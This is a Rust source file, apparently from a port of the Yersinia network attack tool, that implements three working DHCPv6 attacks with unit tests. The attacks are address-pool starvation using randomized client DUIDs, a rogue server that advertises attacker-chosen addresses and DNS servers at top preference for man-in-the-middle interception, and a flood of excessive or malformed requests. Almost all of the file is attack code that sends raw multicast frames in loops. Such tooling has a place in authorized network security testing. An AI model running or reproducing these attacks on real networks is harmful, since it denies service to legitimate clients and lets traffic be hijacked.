//! DHCPv6 Attack Implementations

use super::packet::{Dhcpv6MessageType, Dhcpv6Option, Dhcpv6OptionType, Dhcpv6Packet};
use async_trait::async_trait;
use std::net::Ipv6Addr;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

/// DHCPv6 Starvation Attack
///
/// Rapidly requests IPv6 addresses from DHCPv6 servers using different
/// client identifiers to exhaust the available address pool, causing
/// denial of service for legitimate clients.
#[derive(Debug, Clone)]
pub struct Dhcpv6StarvationAttack {
    /// Rate of requests per second
    pub rate_rps: u32,
    /// Number of addresses to request (None = unlimited)
    pub count: Option<u64>,
    /// Base MAC address for DUID generation (will increment)
    pub base_mac: [u8; 6],
    /// Whether to completely randomize DUIDs
    pub randomize_duid: bool,
    /// Use rapid commit to speed up allocation
    pub use_rapid_commit: bool,
}

impl Dhcpv6StarvationAttack {
    pub fn new(rate_rps: u32) -> Self {
        Self {
            rate_rps,
            count: None,
            base_mac: [0x00, 0x11, 0x22, 0x33, 0x00, 0x00],
            randomize_duid: true,
            use_rapid_commit: true,
        }
    }

    pub fn with_count(mut self, count: u64) -> Self {
        self.count = Some(count);
        self
    }

    pub fn with_base_mac(mut self, mac: [u8; 6]) -> Self {
        self.base_mac = mac;
        self.randomize_duid = false;
        self
    }

    /// Generate MAC for specific request number
    pub fn get_mac_for_request(&self, request_num: u32) -> [u8; 6] {
        if self.randomize_duid {
            [
                rand::random(),
                rand::random(),
                rand::random(),
                rand::random(),
                rand::random(),
                rand::random(),
            ]
        } else {
            let mut mac = self.base_mac;
            mac[4] = ((request_num >> 8) & 0xFF) as u8;
            mac[5] = (request_num & 0xFF) as u8;
            mac
        }
    }

    /// Build SOLICIT packet for starvation
    pub fn build_solicit(&self, request_num: u32) -> Dhcpv6Packet {
        let mac = self.get_mac_for_request(request_num);
        let duid = Dhcpv6Packet::generate_duid_llt(1, mac);
        let txid = Dhcpv6Packet::random_transaction_id();

        let mut packet = Dhcpv6Packet::solicit(txid, duid.clone());

        // Add IA_NA to request an address
        let iaid = request_num;
        packet = packet.add_option(Dhcpv6Option::ia_na(iaid, 0, 0, vec![]));

        if self.use_rapid_commit {
            packet = packet.add_option(Dhcpv6Option::rapid_commit());
        }

        packet
    }

    /// Build REQUEST packet (if not using rapid commit)
    pub fn build_request(
        &self,
        request_num: u32,
        server_duid: Vec<u8>,
        offered_addr: Ipv6Addr,
    ) -> Dhcpv6Packet {
        let mac = self.get_mac_for_request(request_num);
        let duid = Dhcpv6Packet::generate_duid_llt(1, mac);
        let txid = Dhcpv6Packet::random_transaction_id();

        let mut packet = Dhcpv6Packet::request(txid, duid, server_duid);

        // Add IA_NA with the offered address
        let iaid = request_num;
        let ia_addr = Dhcpv6Option::ia_addr(offered_addr, 3600, 7200);
        packet = packet.add_option(Dhcpv6Option::ia_na(iaid, 0, 0, vec![ia_addr]));

        packet
    }
}

/// DHCPv6 Rogue Server Attack
///
/// Responds to DHCPv6 SOLICIT messages with malicious ADVERTISE/REPLY
/// packets, providing fake IPv6 addresses and DNS configuration to
/// hijack client traffic or perform man-in-the-middle attacks.
#[derive(Debug, Clone)]
pub struct Dhcpv6RogueServerAttack {
    /// Rogue server DUID
    pub server_duid: Vec<u8>,
    /// Prefix to allocate addresses from
    pub address_prefix: Ipv6Addr,
    /// Prefix length
    pub prefix_len: u8,
    /// Malicious DNS servers to advertise
    pub dns_servers: Vec<Ipv6Addr>,
    /// Current address counter
    pub address_counter: u32,
    /// Respond faster than legitimate servers (preference)
    pub preference: u8,
    /// Use rapid commit for faster hijacking
    pub use_rapid_commit: bool,
}

impl Dhcpv6RogueServerAttack {
    pub fn new(server_mac: [u8; 6], address_prefix: Ipv6Addr) -> Self {
        Self {
            server_duid: Dhcpv6Packet::generate_duid_llt(1, server_mac),
            address_prefix,
            prefix_len: 64,
            dns_servers: vec![],
            address_counter: 1,
            preference: 255, // Highest preference
            use_rapid_commit: true,
        }
    }

    pub fn with_dns_servers(mut self, servers: Vec<Ipv6Addr>) -> Self {
        self.dns_servers = servers;
        self
    }

    pub fn with_preference(mut self, pref: u8) -> Self {
        self.preference = pref;
        self
    }

    /// Generate next available address
    pub fn get_next_address(&mut self) -> Ipv6Addr {
        let mut octets = self.address_prefix.octets();
        let counter_bytes = self.address_counter.to_be_bytes();

        // Place counter in last 4 bytes
        octets[12] = counter_bytes[0];
        octets[13] = counter_bytes[1];
        octets[14] = counter_bytes[2];
        octets[15] = counter_bytes[3];

        self.address_counter += 1;

        Ipv6Addr::from(octets)
    }

    /// Build ADVERTISE response
    pub fn build_advertise(
        &mut self,
        transaction_id: [u8; 3],
        client_duid: Vec<u8>,
        iaid: u32,
    ) -> Dhcpv6Packet {
        let addr = self.get_next_address();

        let mut packet =
            Dhcpv6Packet::advertise(transaction_id, self.server_duid.clone(), client_duid);

        // Add IA_NA with address
        let ia_addr = Dhcpv6Option::ia_addr(addr, 3600, 7200);
        packet = packet.add_option(Dhcpv6Option::ia_na(iaid, 1800, 3000, vec![ia_addr]));

        // Add preference
        packet = packet.add_option(Dhcpv6Option::new(
            Dhcpv6OptionType::Preference,
            vec![self.preference],
        ));

        // Add DNS servers if specified
        if !self.dns_servers.is_empty() {
            packet = packet.add_option(Dhcpv6Option::dns_servers(self.dns_servers.clone()));
        }

        packet
    }

    /// Build REPLY response (for rapid commit or REQUEST)
    pub fn build_reply(
        &mut self,
        transaction_id: [u8; 3],
        client_duid: Vec<u8>,
        iaid: u32,
    ) -> Dhcpv6Packet {
        let addr = self.get_next_address();

        let mut packet = Dhcpv6Packet::reply(transaction_id, self.server_duid.clone(), client_duid);

        // Add IA_NA with address
        let ia_addr = Dhcpv6Option::ia_addr(addr, 3600, 7200);
        packet = packet.add_option(Dhcpv6Option::ia_na(iaid, 1800, 3000, vec![ia_addr]));

        // Add DNS servers
        if !self.dns_servers.is_empty() {
            packet = packet.add_option(Dhcpv6Option::dns_servers(self.dns_servers.clone()));
        }

        if self.use_rapid_commit {
            packet = packet.add_option(Dhcpv6Option::rapid_commit());
        }

        packet
    }
}

/// DHCPv6 DoS Attack
///
/// Floods DHCPv6 servers with malformed or excessive requests to
/// overwhelm server resources and cause denial of service.
#[derive(Debug, Clone)]
pub struct Dhcpv6DosAttack {
    /// Type of message to flood
    pub message_type: Dhcpv6MessageType,
    /// Rate in packets per second
    pub rate_pps: u32,
    /// Use malformed packets
    pub use_malformed: bool,
    /// Randomize all fields
    pub randomize_all: bool,
    /// Total packets to send (None = unlimited)
    pub count: Option<u64>,
}

impl Dhcpv6DosAttack {
    pub fn new(message_type: Dhcpv6MessageType, rate_pps: u32) -> Self {
        Self {
            message_type,
            rate_pps,
            use_malformed: false,
            randomize_all: true,
            count: None,
        }
    }

    pub fn malformed(mut self) -> Self {
        self.use_malformed = true;
        self
    }

    pub fn with_count(mut self, count: u64) -> Self {
        self.count = Some(count);
        self
    }

    /// Build DoS packet
    pub fn build_packet(&self) -> Dhcpv6Packet {
        let txid = Dhcpv6Packet::random_transaction_id();
        let duid = if self.randomize_all {
            let mac: [u8; 6] = [
                rand::random(),
                rand::random(),
                rand::random(),
                rand::random(),
                rand::random(),
                rand::random(),
            ];
            Dhcpv6Packet::generate_duid_llt(1, mac)
        } else {
            vec![0x00, 0x01, 0x02, 0x03, 0x04, 0x05]
        };

        let mut packet = Dhcpv6Packet::new(self.message_type, txid);

        if self.use_malformed {
            // Add malformed options
            packet = packet.add_option(Dhcpv6Option::new(
                Dhcpv6OptionType::ClientId,
                vec![0xFF; 256], // Oversized DUID
            ));
        } else {
            packet = packet.add_option(Dhcpv6Option::client_id(duid));

            if self.message_type == Dhcpv6MessageType::Solicit {
                let iaid = rand::random::<u32>();
                packet = packet.add_option(Dhcpv6Option::ia_na(iaid, 0, 0, vec![]));
            }
        }

        packet
    }
}

#[async_trait]
impl Attack for Dhcpv6StarvationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_rps.max(1) as u64);
        let mut request_num = 0u32;

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            if let Some(count) = self.count {
                if request_num as u64 >= count {
                    break;
                }
            }

            let dhcpv6_bytes = self.build_solicit(request_num).to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x33, 0x33, 0x00, 0x01, 0x00, 0x02]), // DHCPv6 multicast
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv6,
                dhcpv6_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            request_num += 1;
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "DHCPv6 Starvation"
    }
}

#[async_trait]
#[async_trait]
impl Attack for Dhcpv6RogueServerAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        // This attack is passive - it listens for SOLICIT and responds
        // In a real implementation, it would sniff packets and respond
        // For now, we'll just send unsolicited ADVERTISE messages
        let interval = Duration::from_millis(500);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            // Send rogue ADVERTISE (would normally be in response to SOLICIT)
            let fake_txid = [0x12, 0x34, 0x56];
            let fake_client_duid = vec![0x00, 0x01, 0x02, 0x03];
            let mut attack_clone = self.clone();
            let dhcpv6_bytes = attack_clone
                .build_advertise(fake_txid, fake_client_duid, 1)
                .to_bytes();

            let frame = EthernetFrame::new(
                MacAddress([0x33, 0x33, 0x00, 0x01, 0x00, 0x02]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv6,
                dhcpv6_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "DHCPv6 Rogue Server"
    }
}

#[async_trait]
#[async_trait]
impl Attack for Dhcpv6DosAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps.max(1) as u64);
        let mut sent = 0u64;

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            if let Some(count) = self.count {
                if sent >= count {
                    break;
                }
            }

            let dhcpv6_bytes = self.build_packet().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x33, 0x33, 0x00, 0x01, 0x00, 0x02]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv6,
                dhcpv6_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            sent += 1;
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "DHCPv6 DoS"
    }
}
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_starvation_attack() {
        let attack = Dhcpv6StarvationAttack::new(10).with_count(100);
        let packet = attack.build_solicit(1);

        assert_eq!(packet.msg_type, Dhcpv6MessageType::Solicit);
        assert!(packet
            .options
            .iter()
            .any(|o| o.option_type == Dhcpv6OptionType::ClientId));
    }

    #[test]
    fn test_rogue_server_attack() {
        let mut attack = Dhcpv6RogueServerAttack::new(
            [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF],
            "2001:db8::".parse().unwrap(),
        )
        .with_dns_servers(vec!["2001:db8::53".parse().unwrap()]);

        let client_duid = vec![0x00, 0x01, 0x02, 0x03];
        let packet = attack.build_advertise([0x12, 0x34, 0x56], client_duid, 1);

        assert_eq!(packet.msg_type, Dhcpv6MessageType::Advertise);
        assert!(packet
            .options
            .iter()
            .any(|o| o.option_type == Dhcpv6OptionType::ServerId));
    }

    #[test]
    fn test_dos_attack() {
        let attack = Dhcpv6DosAttack::new(Dhcpv6MessageType::Solicit, 1000).malformed();
        let packet = attack.build_packet();

        assert_eq!(packet.msg_type, Dhcpv6MessageType::Solicit);
    }
}
